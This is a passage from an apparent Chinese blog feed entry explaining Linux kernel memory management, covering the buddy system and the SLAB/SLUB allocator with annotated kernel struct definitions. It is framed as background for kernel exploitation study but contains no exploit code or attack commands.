class="lvl-1"><li class="lvl-2"><p>不可移动页：在内存中有固定位置，不能移动到其他地方。内核中使用的页大部分是属于这种类型。</p></li><li class="lvl-2"><p>可回收页：不能直接移动，但可以删除，页中的内容可以从某些源中重新生成。例如，页内容是映射到文件数据的页就属于这种类型。对于这种类型，在内存短缺(分配失败)时，会发起内存回收，将这类型页进行回写释放。</p></li><li class="lvl-2"><p>可移动页：可随意移动，用户空间的进程使用的没有映射具体磁盘文件的页就属于这种类型(比如堆、栈、shmem共享内存、匿名mmap共享内存)，它们是通过进程页表映射的，把这些页复制到新位置时，只要更新进程页表就可以了。一般这些页是从高端内存管理区获取。</p></li></ul></blockquote><p>buddy system每个free_area元素都有一个<code>free_list[4]</code>链表指针数组，对应了四种不同的页属性。每个链上的属性都一致，每个free_area的连续页数量也都一致。</p><h2 id="分配和释放逻辑">分配和释放逻辑</h2><p>在请求空间的时候，buddy system首先会将需求向2的幂次对齐，然后去对应的下标取出连续空间。</p><ul class="lvl-0"><li class="lvl-2"><p>匹配属性和大小，找到对应的free_list链表往下摘</p></li><li class="lvl-2"><p>如果对应的链表为空，就向下一个free_area去请求，请求到后一分为二，返回一个，将另一个放进上面的链表。再空就继续向上找。</p></li><li class="lvl-2"><p>释放后连续的就放到对应链表上（bin），空闲的就合并往更高层放。</p></li></ul><p>而外部碎片的问题只是被很大程度的减弱了，而并没有被完全解决，内核还会执行页面迁移来减少碎片，不再赘述。这个页面迁移的内核接口是很多别的功能的基础</p><blockquote><p><a href="https://blog.csdn.net/yhb1047818384/article/details/119920971">https://blog.csdn.net/yhb1047818384/article/details/119920971</a><br>可以发现， 页面迁移不是简单的把一个page从A位置移动到B位置，它的本质是一个分配新页面，将旧页面的内容拷贝至新页面，解除旧页面的映射关系，并将映射关系映射到新页面，最后释放旧页面的过程。</p></blockquote><h1>Slab/Slub</h1><p><strong>这是我们利用内核UAF要主要掌握的内容</strong></p><p>slab是运行于buddy system之上的一个更小粒度的内存分配系统。用于解决内部碎片的问题。像file和task_struct等等这些频繁使用的小结构体， 伙伴系统只能每次申请至少一个page,显然没法满足我们这种需求，slab就出现了。</p><p>slab是最早的版本，而这个版本太古早以至于有很多问题，一个很重要的问题就是NUMA架构的支持不好（尽管我们现在都用的是这个架构），非常臃肿。因此被大神们优化成了现在用的slub系统。保留了基本的思想框架，对很多细节和实现做了优化，包括放弃了着色系统，多处理器和NUMA优化等等。但是linux内核中相关的接口都以slab命名，开发者们也都保留了这些名称，因此下面的slab和slub很可能会混用，读者可以自行分辨。</p><p>另外，slob则是更针对嵌入式系统的一个内存分配系统</p><blockquote><p>参考：（强烈推荐）：<a href="https://segmentfault.com/a/1190000043626203#item-4">https://segmentfault.com/a/1190000043626203#item-4</a><br><a href="https://blog.csdn.net/qq_54218833/article/details/127218102">https://blog.csdn.net/qq_54218833/article/details/127218102</a></p></blockquote><h2 id="概述">概述</h2><p>首先，我们来看slab的一个简单的概述。slab从buddy申请来连续的内存页后，按照对象的大小将其池化成很多小的/内存对齐的对象。它们用kmem_cache管理，链接在链表上，然后充分利用cpu缓存和程序局部性来进行高速的分配和释放</p><blockquote><p>上面这段其实是写完之后回头再写的</p></blockquote><p>slab的管理层级大概是kmem_cache(slab_cache)-&gt;slab(freelist/pageframes)-&gt;object的逻辑，要具体掌握slab机制比较麻烦，下面按照拆解组成，分配，释放三个部分, 以自顶向下的逻辑大概介绍下slab。（其实自底向上会更好理解一些具体的实现）</p><h2 id="拆解组件">拆解组件</h2><h3 id="kmem-cache">kmem_cache</h3><p>在slab中，它所管理的内存分配单元称为“对象”(Object)。而这些slab则是被slab cache所管理的slab池（层层池化？），用一个<code>kmem_cache</code>结构体管理。<br>kmem_cache是一个分配器，可以理解成类似main_arena的东西。而从buddy system每次取来的一个或几个连续的页框被称为一个<code>slab</code>，slab分配器将每个slab拆分成若干对象向下一级进行分配。一个kmem_cache对应某一种功能/大小的对象分配，所有的kmem_cache被存放在一个数组中管理。</p><p>slub kmem_cache结构（<strong>缝合了源码和大佬的部分注释版本，不代表结构体定义，仅供理解</strong>）:</p><blockquote><p>随手写一下，染色系统是为了解决多CPU cache缓存不同大小但slab内相同偏移对象时会处于同一行的问题所创立的，但是可能没什么太大用被slub删掉了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SLUB_TINY</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span> <span class="comment">// 关键字段</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// slab cache 的管理标志位，用于设置 slab 的一些特性</span></span><br><span class="line">    <span class="comment">// 比如：slab 中的对象按照什么方式对齐，对象是否需要 POISON  毒化，是否插入 red zone 在对象内存周围，是否追踪对象的分配和释放信息 等等</span></span><br><span class="line">    <span class="type">slab_flags_t</span> flags;</span><br><span class="line">    <span class="comment">// slab 对象在内存中的真实占用，包括为了内存对齐填充的字节数，red zone 等等</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;  <span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">    <span class="comment">// slab 中对象的实际大小，不包含填充的字节数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">    <span class="comment">// slab 对象池中的对象在没有被分配之前，我们是不关心对象里边存储的内容的。</span></span><br><span class="line">    <span class="comment">// 内核巧妙的利用对象占用的内存空间存储下一个空闲对象的地址。</span></span><br><span class="line">    <span class="comment">// offset 表示用于存储下一个空闲对象指针的位置距离对象首地址的偏移</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;    <span class="comment">/* Free pointer offset */</span></span><br><span class="line">    <span class="comment">// 表示 cache 中的 slab 大小，包括 slab 所需要申请的页面个数，以及所包含的对象个数</span></span><br><span class="line">    <span class="comment">// 其中低 16 位表示一个 slab 中所包含的对象总数，高 16 位表示一个 slab 所占有的内存页个数。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line">    <span class="comment">// slab 中所能包含对象以及内存页个数的最大值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">    <span class="comment">// 当按照 oo 的尺寸为 slab 申请内存时，如果内存紧张，会采用 min 的尺寸为 slab 申请内存，可以容纳一个对象即可。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">    <span class="comment">// 向伙伴系统申请内存时使用的内存分配标识</span></span><br><span class="line">    <span class="type">gfp_t</span> allocflags; </span><br><span class="line">    <span class="comment">// slab cache 的引用计数，为 0 时就可以销毁并释放内存回伙伴系统重</span></span><br><span class="line">    <span class="type">int</span> refcount;   </span><br><span class="line">    <span class="comment">// 池化对象的构造函数，用于创建 slab 对象池中的对象</span></span><br><span class="line">    <span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">    <span class="comment">// 对象的 object_size 按照 word 字长对齐之后的大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inuse;  </span><br><span class="line">    <span class="comment">// 对象按照指定的 align 进行对齐</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> align; </span><br><span class="line">    <span class="comment">// slab cache 的名称， 也就是在 slabinfo 命令中 name 那一列</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// info used for slab</span></span><br><span class="line"><span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有三个字段值得我们关注，一是flag，里面有很多各种各样的配置信息以及flag,比如是否64字节对齐，是否开启slab毒化，是否用red_zone防止OOB, 指定映射区域来自哪里（默认都是NORMAL）等等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Red zone objs in a cache */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_RED_ZONE  ((slab_flags_t __force)0x00000400U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Poison objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_POISON  ((slab_flags_t __force)0x00000800U)</span></span><br><span class="line"><span class="comment">/* Align objs on cache lines */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_HWCACHE_ALIGN ((slab_flags_t __force)0x00002000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA  ((slab_flags_t __force)0x00004000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA32 memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA32 ((slab_flags_t __force)0x00008000U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Store the last owner for bug hunting */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_STORE_USER </span></span><br></pre></td></tr></table></figure><p>二是开头的__percpu变量<br>6.11.5版本内核的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span> **freelist;   <span class="comment">// 指向被 CPU 本地缓存的 slab 中第一个空闲的对象</span></span><br><span class="line">            <span class="comment">// 保证进程在 slab cache 中获取到的 cpu 本地缓存 kmem_cache_cpu 与当前执行进程的 cpu 是一致的。</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">freelist_aba_t</span> freelist_tid;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">// slab cache 中 CPU 本地所缓存的 slab，</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="comment">// cpu cache 缓存的备用 slab 列表</span></span><br><span class="line">    <span class="comment">// 当被本地 cpu 缓存的 slab 中没有空闲对象时，内核会从 partial 列表中的 slab 中查找空闲对象</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">    <span class="comment">// 记录 slab 分配对象的一些状态信息</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个cpu缓存是我们分配的主要来源。主要是里面缓存的一个slab和一个partial列表。后面在分配会讲到他们的用法。freelist将会成为后续我们pwn的对象之一。</p><p>最后一个字段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span><span class="comment">/* partial list first, better asm code */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> total_slabs;<span class="comment">/* length of all slab lists */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_slabs;<span class="comment">/* length of free slab list only */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> colour_next;<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span><span class="comment">/* shared per node */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span><span class="comment">/* on other nodes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> next_reap;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="type">int</span> free_touched;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="type">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，如果使用slab，每个kmem节点要管理三个双向链表，分别是partial,full和free.顾名思义，partial管理有部分空闲对象的slab,full则管理已经全部被分配满的slab，free表示完全空闲的slab. 这三个链表是动态转化的，根据当前的分配情况实时移动。并且free太多会向buddy合并。</p><p>而使用slub的时候就直接删除了free和full链表，只保留了partial。</p><p>我们可以直接通过<code>cat /proc/slabinfo</code>查看当前所有的slab_cache。</p><h3 id="slab">slab</h3><p>从buddy system取来的页面被拆成一堆object放入了freelist构成我们的一个对象池。用这样一张图可以比较好的表示：</p><p><img src="/images/linux_mem/slab_struct.png" alt="slab1.png"></p><p>slab是管理内存分配和释放的基本单位。若干个slab也构成了一个池子被slab_cache管理，同时他们向上级buddy申请内存。</p><p>对于老一点的内核版本比如5.4，slab并没有单独的结构体进行管理，而是全部存储在page中。但随着内核的发展，我们需要对page结构体进行精简，也就将slab结构单独抽了出来从而减少page结构体的大小。但是page该有的指针什么的还是得有。</p><blockquote><p>linux-5.18.19</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* array of free object indexes */</span></span><br><span class="line"><span class="type">void</span> *s_mem;<span class="comment">/* first object */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="type">void</span> *__unused_1;</span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free block */</span></span><br><span class="line"><span class="type">long</span> units;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freelist直接指向当前的空闲对象，每个空闲对象则同时以链表的形式相互连接。slab不单独维护空闲的对象，他们都是同时连续存放的，如果全free了就直接放进kmem_cache的free,只有partial的时候会用freelist-&gt;object.next这种形式连接一个内部空闲对象链表。</p><p>slab其实本身没啥内容，大头都让kmem_cache干了。</p><blockquote><p>旧版的slab采用一个描述符数组来管理对象的分配和释放，而且slab内同样维护了</p></blockquote><h3 id="Object">Object</h3><p>每个Object是由slab去分配，真正返回给内核程序使用的。只不过和chunk相比，Object似乎管理和结构都既更加简单又更加复杂。</p><p>说更加简单，是因为他们不需要像bin索引这样的方法，没有fdbk那么多东西，都是线性映射。顶天了也就是partial的遍历以下，直接slub用一个free_list指针指到没分配的对象，取的时候几乎是一键返回。</p><p>说更加复杂，是因为在内核中还有其他的奇怪机制（部分是可配置的）。比如防止越界读写的red_zone, 使用特殊字符填充object的slab_poison等等。前者是会在object两侧空余空间防越界读写（和内存对齐结合起来利用），后者则是用0x6b填充对象并以0x5a结尾，在它们释放或者刚从buddy取出的时候。另外还需要其他的track信息来附加在object末尾，因此最后一个object大概是这样的结构：</p><p><img src="/images/linux_mem/object.png" alt="object.png"></p><h2 id="分配与释放（简化概述）">分配与释放（简化概述）</h2><blockquote><p><a href="https://segmentfault.com/a/1190000043626203#item-6">https://segmentfault.com/a/1190000043626203#item-6</a><br>写得很好，我只是自己理解后抄一遍罢了，很难想象理解这么深刻的大佬能写和画的这么直观</p></blockquote><h3 id="分配">分配</h3><ul class="lvl-0"><li class="lvl-2"><p>从cpu缓存中直接分配，kmem_cpu_cache-&gt;slab取，我们称为快速路径，如果有空闲对象freelist直接取出对象返回</p></li><li class="lvl-2"><p>freelist为空，kmem_cpu_cache-&gt;slab已经满，则从cpu缓存partial中分配，我们称为慢速路径，需要遍历查看，找到能分配的slab后将该slab提升至cache并分配</p></li><li class="lvl-2"><p>partial也被取完了，则要返回kmem_cache结构，从node的partial链表中找，遍历一遍，同样找到后提升至cpu_cache, 并且将剩余的slab全部连接到cpu_cache-&gt;partial下（数量有限制）</p></li><li class="lvl-2"><p>全空了（比如刚创建），从buddy申请，依据kmem_cache的字段去要，要到slab直接提升到cpu缓存</p></li><li class="lvl-2"><p>拿到后会经过池化，slab poison等等细节操作不再赘述</p></li></ul><h3 id="释放">释放</h3><ul class="lvl-0"><li class="lvl-2"><p>如果释放的对象在cpu_cache-&gt;slab中，那就直接放回该slab并修正freelist指针，我们称为快速路径</p></li><li class="lvl-2"><p>如果释放的对象在cpu_cache-&gt;partial中，也是直接放回然后修改free_list和pointer</p></li><li class="lvl-2"><p>如果释放的对象在kmem_cache_node-&gt;partial中，也是直接放回</p></li><li class="lvl-2"><p>如果对象释放后，原本的full变为了partial，且不在cpu本地缓存中，那么内核会将这个slab重新插入到cpu_cache的partial链表中。</p></li></ul><blockquote><p>因为 slab 之前之所以是一个 full slab，恰恰证明了该 slab 是一个非常活跃的 slab，常常供不应求导致变成了一个 full slab，当对象释放之后，刚好变成 partial slab，这时需要将这个被频繁访问的 slab 放入 cpu 缓存中，加快下次分配对象的速度。</p></blockquote><p>当然，cpu_cache是很宝贵的，我们不能什么都往里塞。kmem_cache-&gt;cpu_partial规定了一个数量，超过的话就会将所有的cpu partial转移到kmem_node的partial中。这个检查是第一位的。这也是有说法的：</p><blockquote><p>CPU partial爆炸的时候，说明内核当前所处的场景是一个内存释放频繁的场景。kmem_cache_cpu-&gt;partial 链表太满了，而内存分配的请求又不是很多，kmem_cache_cpu 中缓存的 slab 并不会频繁的消耗。这样一来，就需要将链表中的所有 slab 一次性转移到 NUMA 节点缓存 partial 链表中备用。</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>如果对象释放后，slab从partial变成了empty，内核会将该slab插入节点缓存，也就是kmem_cache_node-&gt;partial中</p></li></ul><p>舍弃了slab中的empty，全放进partial的话就需要一些流程。kmem_cache-&gt;min_partial中规定了node中缓存的slab个数上限。partial超过这个值会将所有的empty slab回收至buddy system.这个检查也是插入前优先进行</p><h2 id="总结">总结</h2><p>至此，slab/slub的架构如下：</p><p><img src="/images/linux_mem/construct.png" alt="architect.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们都知道，进程内部寻址用的是虚拟地址，虚拟地址要经过mmu被映射到物理地址，进程的页表是独立的等等。但是那么多页表，内核又是怎么调度页表的呢？在我们向内核申请下一个4kb的时候究竟发生了什么？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考自：&lt;a href=&quot;https:</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
</feed>
